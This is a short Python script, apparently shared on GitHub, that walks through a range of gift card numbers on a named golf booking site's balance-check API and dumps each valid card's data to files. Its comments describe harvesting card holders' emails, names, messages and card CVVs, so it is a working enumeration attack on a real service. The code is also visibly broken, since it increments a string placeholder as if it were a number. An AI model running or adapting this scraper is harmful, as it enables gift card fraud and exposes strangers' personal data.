# Github: https://github.com/mehadh
# This is a program which can be used to pull information from valid giftcards of www.golfnow.com.
# Unlike normal exploitation of APIs, this site is particularly dangerous as it exposes more than simply the balance.
# Elements exposed by simply pinging a card number are: Balance, CVV, email, sender's name, receiver's name, message, purchase date, along with some more details.
# The number presented in "number2" is simply one range of valid numbers, however more can easily be discovered.


import requests
from bs4 import BeautifulSoup
import os

number2 = "Here is where you'll insert the valid number, but with the last four digits as 0000"
while number2 < "The same as the number above, but with 9999 at the end":  # These numbers are for the range, they should be able to fluctuate, but I'm not 100% sure about it.
    url = "https://giftcard.golfnow.com/api/checkBalance?number=" # This is the API link.
    durl = url + str(number2) # The base URL + the card number
    response = requests.get(durl) # Request the page
    if response.status_code == 200: # Was it successful?
        soup = BeautifulSoup(response.text, 'html.parser') # Parse the text!
        if len(str(soup)) > 2: # This means that it was a hit!
            print(soup) # Dump the contents. There's a LOT of stuff here that shouldn't be here, such as the giftcard holders email, the CVV of the giftcard, perhaps the barcode, etc.
            file = open(str(number2)+".txt", "a") # Simply viewing the dumped contents should show a good amount of information that one wouldn't expect to be easily viewable.
            string = str(soup) # This is the entirety of what the API gives you, in string form.
            file.write(string) # Write it to the file.
            file.close() # Close the file!
        else:
            print(str(number2)+" is empty.") # Show progress.
        number2 += 1 # Increment the number and keep going!
    else: # Used for debugging if the script is not successfully pinging the page.
        print (response.text)
        print(response.status_code)
else:
    print("Range finished!")
    os.system('pause')
    exit()
    
    

